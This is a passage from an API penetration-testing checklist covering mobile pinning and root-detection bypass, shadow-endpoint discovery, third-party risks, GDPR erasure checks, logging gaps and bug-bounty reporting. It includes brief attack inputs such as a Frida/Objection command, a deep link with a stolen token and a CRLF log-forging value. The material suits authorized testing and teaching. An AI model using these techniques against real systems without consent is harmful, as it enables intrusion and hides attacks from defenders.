**Phase:** 17-Mobile · **Category:** Mobile API · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Mobile app backend API &amp; stored secrets

**Test Steps:** 1. Frida / Objection: android sslpinning disable<br>2. Intercept API in Burp<br>3. Discover undocumented endpoints

**Expected Result:** Pinning bypass should be tested with consent

**Payload / PoC Example:**

```
objection -g com.target.app explore
```

**Impact:** Reveals shadow APIs

**Tools:** Frida,Objection,MobSF

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API9:2023 Improper Inventory Management

---

## API-0571 — Certificate Pinning Bypass
**Phase:** 17-Mobile · **Category:** Mobile API · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Mobile app backend API &amp; stored secrets

**Test Steps:** 1. Identify certificate pinning<br><br>2. Use Frida/Objection to bypass<br><br>3. Intercept HTTPS traffic<br><br>4. Analyze API communications

**Expected Result:** Should implement robust certificate pinning

**Payload / PoC Example:**

```
Bypassable certificate pinning
```

**Impact:** Mobile backend/API flaws; hardcoded secrets &amp; weak pinning

**Tools:** Frida/Objection

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0572 — Root/Jailbreak Detection Bypass
**Phase:** 17-Mobile · **Category:** Mobile API · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Mobile app backend API &amp; stored secrets

**Test Steps:** 1. Identify root/jailbreak detection<br><br>2. Use bypass tools<br><br>3. Run app on rooted device<br><br>4. Access protected functionality

**Expected Result:** Should implement robust device integrity checks

**Payload / PoC Example:**

```
Bypassable root detection
```

**Impact:** Mobile backend/API flaws; hardcoded secrets &amp; weak pinning

**Tools:** Frida/Objection

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0573 — Insecure Local Storage
**Phase:** 17-Mobile · **Category:** Mobile API · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Mobile app backend API &amp; stored secrets

**Test Steps:** 1. Access mobile app data directory<br><br>2. Check for unencrypted sensitive data<br><br>3. Extract tokens and credentials<br><br>4. Abuse stored secrets

**Expected Result:** Should encrypt sensitive data at rest

**Payload / PoC Example:**

```
Tokens stored in SharedPreferences/NSUserDefaults
```

**Impact:** Mobile backend/API flaws; hardcoded secrets &amp; weak pinning

**Tools:** adb/Frida

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0574 — Deep Link Exploitation
**Phase:** 17-Mobile · **Category:** Mobile API · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Mobile app backend API &amp; stored secrets

**Test Steps:** 1. Identify registered deep links<br><br>2. Craft malicious deep link<br><br>3. Trigger sensitive functionality<br><br>4. Bypass authentication flow

**Expected Result:** Should validate deep link parameters

**Payload / PoC Example:**

```
myapp://auth?token=stolen_token
```

**Impact:** Mobile backend/API flaws; hardcoded secrets &amp; weak pinning

**Tools:** Manual

**References:** -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10 (BOLA/BFLA/BOPLA); PortSwigger Access Control; disclosed IDOR writeups; API8:2023 Security Misconfiguration

---

## API-0575 — .well-known files leak provider info
**Phase:** 18-Inventory · **Category:** Information Disclosure · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Info · **CVSS:** 0.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

**Where to Test / Injection Point:** GET Error responses / verbose output / metadata

**Test Steps:** 1. Hit /.well-known/openid-configuration /oauth-authorization-server /security.txt /assetlinks.json<br>2. Note OAuth endpoints, scopes, mobile package names

**Expected Result:** Expected; minimize exposed data

**Payload / PoC Example:**

```
GET /.well-known/openid-configuration
```

**Impact:** Discovery aid

**Tools:** manual

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0576 — Old API versions still active
**Phase:** 18-Inventory · **Category:** Inventory · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GET API versions / deprecated &amp; shadow endpoints

**Test Steps:** 1. Hit /v1 /v2 /v3 /legacy /internal<br>2. Check changelog for removed endpoints<br>3. Try known CVEs against old versions

**Expected Result:** Deprecate and disable old versions

**Payload / PoC Example:**

```
/api/v1 with known CVE
```

**Impact:** Backdoor via old code

**Tools:** manual,nuclei

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0577 — Public Swagger / OpenAPI in production
**Phase:** 18-Inventory · **Category:** Inventory · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GET API versions / deprecated &amp; shadow endpoints

**Test Steps:** 1. Probe /swagger-ui /api-docs /openapi.json /redoc /docs /api/swagger<br>2. Check authn requirement<br>3. Extract endpoints

**Expected Result:** Authn-gated docs; or remove

**Payload / PoC Example:**

```
GET /api-docs without auth
```

**Impact:** Full endpoint inventory leak

**Tools:** DirBuster,nuclei

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0578 — API Documentation Publicly Accessible
**Phase:** 18-Inventory · **Category:** Inventory · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API versions / deprecated &amp; shadow endpoints

**Test Steps:** 1. Access /swagger /docs /api-docs<br>2. Check if authentication required<br>3. Review exposed endpoints

**Expected Result:** Should require authentication for documentation

**Payload / PoC Example:**

```
Public access to /swagger-ui.html
```

**Impact:** Shadow/deprecated API versions reachable; expanded attack surface

**Tools:** Manual

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0579 — Undocumented Endpoint Discovery
**Phase:** 18-Inventory · **Category:** Inventory · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API versions / deprecated &amp; shadow endpoints

**Test Steps:** 1. Fuzz for undocumented endpoints<br><br>2. Check for debug/test endpoints<br><br>3. Access deprecated API versions<br><br>4. Enumerate hidden functionality

**Expected Result:** Should document and secure all endpoints

**Payload / PoC Example:**

```
/api/debug /api/internal /api/test
```

**Impact:** Shadow/deprecated API versions reachable; expanded attack surface

**Tools:** DirBuster/ffuf

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0580 — Shadow API Discovery
**Phase:** 18-Inventory · **Category:** Inventory · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API versions / deprecated &amp; shadow endpoints

**Test Steps:** 1. Enumerate subdomains<br><br>2. Check for undocumented APIs<br><br>3. Access forgotten APIs<br><br>4. Test security controls

**Expected Result:** Should maintain complete API inventory

**Payload / PoC Example:**

```
api-dev.example.com api-staging.example.com
```

**Impact:** Shadow/deprecated API versions reachable; expanded attack surface

**Tools:** Subfinder/Amass

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0581 — Deprecated API Access
**Phase:** 18-Inventory · **Category:** Inventory · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API versions / deprecated &amp; shadow endpoints

**Test Steps:** 1. Identify current API version<br><br>2. Try older versions (v1 v2)<br><br>3. Check if deprecated versions active<br><br>4. Test for weaker security

**Expected Result:** Should decommission deprecated APIs

**Payload / PoC Example:**

```
/api/v1/ still accessible with weaker auth
```

**Impact:** Shadow/deprecated API versions reachable; expanded attack surface

**Tools:** Burp Suite

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0582 — API Documentation Exposure
**Phase:** 18-Inventory · **Category:** Inventory · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API versions / deprecated &amp; shadow endpoints

**Test Steps:** 1. Access common doc paths<br><br>2. Check /swagger /openapi /graphql<br><br>3. Download API specification<br><br>4. Map complete attack surface

**Expected Result:** Should protect API documentation

**Payload / PoC Example:**

```
Public access to /swagger-ui.html
```

**Impact:** Shadow/deprecated API versions reachable; expanded attack surface

**Tools:** Manual

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0583 — Unsafe Third-Party API Consumption
**Phase:** 18-Inventory · **Category:** Third-Party/Supply Chain · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Upstream/third-party API consumption

**Test Steps:** 1. Identify third-party API integrations<br><br>2. Intercept upstream API responses<br><br>3. Inject malicious data in responses<br><br>4. Check if properly validated

**Expected Result:** Should validate and sanitize upstream API responses

**Payload / PoC Example:**

```
Malicious data in third-party API response
```

**Impact:** Unsafe upstream API consumption / dependency confusion

**Tools:** Burp Suite

**References:** -&gt;[Dependency Confusion checklist](#/checklist/depconfusion); Alex Birsan 'Dependency Confusion' (2021); Assetnote supply-chain research; API10:2023 Unsafe Consumption of APIs

---

## API-0584 — Third-Party Redirect Abuse
**Phase:** 18-Inventory · **Category:** Third-Party/Supply Chain · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Upstream/third-party API consumption

**Test Steps:** 1. Find third-party redirects<br><br>2. Manipulate redirect destination<br><br>3. Bypass origin validation<br><br>4. Steal tokens via redirect

**Expected Result:** Should validate all redirect URLs

**Payload / PoC Example:**

```
OAuth redirect to third-party with token in fragment
```

**Impact:** Unsafe upstream API consumption / dependency confusion

**Tools:** Burp Suite

**References:** -&gt;[Dependency Confusion checklist](#/checklist/depconfusion); Alex Birsan 'Dependency Confusion' (2021); Assetnote supply-chain research; API2:2023 Broken Authentication

---

## API-0585 — Third-Party Script Inclusion
**Phase:** 18-Inventory · **Category:** Third-Party/Supply Chain · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Upstream/third-party API consumption

**Test Steps:** 1. Identify included third-party scripts<br><br>2. Check for SRI integrity attributes<br><br>3. Attempt to compromise CDN/script<br><br>4. Execute malicious code

**Expected Result:** Should use SRI for third-party scripts

**Payload / PoC Example:**

```
Third-party JS without integrity check
```

**Impact:** Unsafe upstream API consumption / dependency confusion

**Tools:** Manual

**References:** -&gt;[Dependency Confusion checklist](#/checklist/depconfusion); Alex Birsan 'Dependency Confusion' (2021); Assetnote supply-chain research; API8:2023 Security Misconfiguration

---

## API-0586 — GDPR right-to-erasure incomplete
**Phase:** 19-Compliance · **Category:** Compliance · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** DELETE Data-handling &amp; privacy controls

**Test Steps:** 1. Create test account with PII<br>2. Delete via API<br>3. Verify via IDOR / search / admin endpoints that data is purged

**Expected Result:** Hard delete or anonymize across all systems

**Payload / PoC Example:**

```
GET /api/admin/users/USER-123 should 404
```

**Impact:** Regulatory penalty

**Tools:** Burp Suite

**References:** OWASP API Security Top 10 (2023); OWASP WSTG; APISecUniversity; PortSwigger Web Academy; API3:2023 Broken Object Property Level Authorization

---

## API-0587 — GDPR - Right to Erasure API Check
**Phase:** 19-Compliance · **Category:** Compliance · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data-handling &amp; privacy controls

**Test Steps:** 1. Request account deletion<br>2. Check if all PII purged from API responses<br>3. Test if deleted user data still accessible via IDOR

**Expected Result:** Deleted user data purged from all systems; IDOR returns 404 post-deletion

**Payload / PoC Example:**

```
DELETE /api/account/me → then GET /api/users/123 (deleted user) → should 404
```

**Impact:** Regulatory/privacy control gap (PII, retention, consent)

**Tools:** Burp Suite, Manual

**References:** OWASP API Security Top 10 (2023); OWASP WSTG; APISecUniversity; PortSwigger Web Academy; API9:2023 Improper Inventory Management

---

## API-0588 — GDPR Right to Erasure Verification
**Phase:** 19-Compliance · **Category:** Compliance · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** GET Data-handling &amp; privacy controls

**Test Steps:** 1. Create account and add personal data<br>2. Request account deletion via API<br>3. Check if all PII purged from API responses<br>4. Verify via IDOR that deleted user data inaccessible<br>5. Check backup/archive endpoints

**Expected Result:** Deleted user data purged from all systems; all associated objects anonymized; IDOR returns 404

**Payload / PoC Example:**

```
# Create and delete test
POST /api/users {"email":"gdpr-test@example.com","name":"Test User"}
→ {"id": "USER-123"}

DELETE /api/users/USER-123/account
→ {"message":"Account scheduled for deletion"}

# Verify erasure
GET /api/users/USER-123 → 404 (not just 403!)
GET /api/posts?userId=USER-123 → empty list (not user's posts)
GET /api/comments/COMMENT-BY-USER-123 → 404 or anonymized

# Check admin endpoints still expose data
GET /api/admin/users/USER-123 → should be 404 or anonymized

# Check backup/export endpoints
GET /api/admin/export?userId=USER-123 → should not contain PII

# Search for ghost data
GET /api/search?q=gdpr-test@example.com → should return no results

# Check audit logs don't expose PII
GET /api/admin/audit?userId=USER-123 → should be anonymized
```

**Impact:** Regulatory/privacy control gap (PII, retention, consent)

**Tools:** Burp Suite, Manual

**References:** OWASP API Security Top 10 (2023); OWASP WSTG; APISecUniversity; PortSwigger Web Academy; API8:2023 Security Misconfiguration

---

## API-0589 — PII in error responses
**Phase:** 19-Compliance · **Category:** Information Disclosure · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GET Error responses / verbose output / metadata

**Test Steps:** 1. Trigger 4xx/5xx on every endpoint<br>2. Look for email phone token credit_card in error details

**Expected Result:** Generic error codes; no PII

**Payload / PoC Example:**

```
{"error":"User not found","email":"victim@x.com"}
```

**Impact:** PII leak; regulatory issue

**Tools:** Burp Suite

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API3:2023 Broken Object Property Level Authorization

---

## API-0590 — Sensitive data in response headers
**Phase:** 19-Compliance · **Category:** Information Disclosure · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** GET Error responses / verbose output / metadata

**Test Steps:** 1. Inspect headers for X-Powered-By Server X-Backend X-Debug X-Internal-Token<br>2. Check across all endpoints

**Expected Result:** Strip server fingerprint; no internal data

**Payload / PoC Example:**

```
X-Backend-Server: internal-db-01
```

**Impact:** Aids attacker; sometimes leaks tokens

**Tools:** curl,Burp

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API8:2023 Security Misconfiguration

---

## API-0591 — Insufficient Logging and Monitoring
**Phase:** 19-Compliance · **Category:** Logging &amp; Monitoring · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Audit/log pipeline &amp; monitoring

**Test Steps:** 1. Perform malicious actions<br>2. Check if logged<br>3. Test alerting

**Expected Result:** Should log security events and alert on anomalies

**Payload / PoC Example:**

```
No logs for failed auth attempts
```

**Impact:** Insufficient logging hampers detection of attacks

**Tools:** Manual

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0592 — Log Forging
**Phase:** 19-Compliance · **Category:** Logging &amp; Monitoring · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Audit/log pipeline &amp; monitoring

**Test Steps:** 1. Find parameter that gets logged<br><br>2. Inject CRLF and fake log entries<br><br>3. Create misleading audit trail<br><br>4. Hide malicious activity

**Expected Result:** Should sanitize log input

**Payload / PoC Example:**

```
param=test%0aINFO: Legitimate user action
```

**Impact:** Insufficient logging hampers detection of attacks

**Tools:** Burp Suite

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API8:2023 Security Misconfiguration

---

## API-0593 — Insufficient Security Logging
**Phase:** 19-Compliance · **Category:** Logging &amp; Monitoring · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Audit/log pipeline &amp; monitoring

**Test Steps:** 1. Perform malicious actions<br><br>2. Check if actions logged<br><br>3. Verify log completeness<br><br>4. Test alerting mechanisms

**Expected Result:** Should log all security-relevant events

**Payload / PoC Example:**

```
Failed auth attempts not logged
```

**Impact:** Insufficient logging hampers detection of attacks

**Tools:** Manual

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0594 — CVSS v3.1 scoring template
**Phase:** 20-Reporting · **Category:** Security Misconfiguration · **OWASP API 2023:** N/A · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Decide vector: AV:N AC:L PR:? UI:? S:? C/I/A:?<br>2. Justify each metric with one line<br>3. Map to OWASP API Top 10

**Expected Result:** Be honest; overclaim = duplicate/closed

**Payload / PoC Example:**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

**Impact:** Determines payout

**Tools:** FIRST CVSS calc

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec

---

## API-0595 — PoC video and write-up checklist
**Phase:** 20-Reporting · **Category:** Security Misconfiguration · **OWASP API 2023:** N/A · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Title leads with impact<br>2. Repro steps copy-pastable<br>3. PoC video &lt; 60s redacted<br>4. Quantify records affected<br>5. Suggested fix with cite

**Expected Result:** Standard hacker bounty format

**Payload / PoC Example:**

```
Markdown PoC + mp4 attached
```

**Impact:** Higher payout / faster triage

**Tools:** Notion,Obsidian,ffmpeg

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec

---
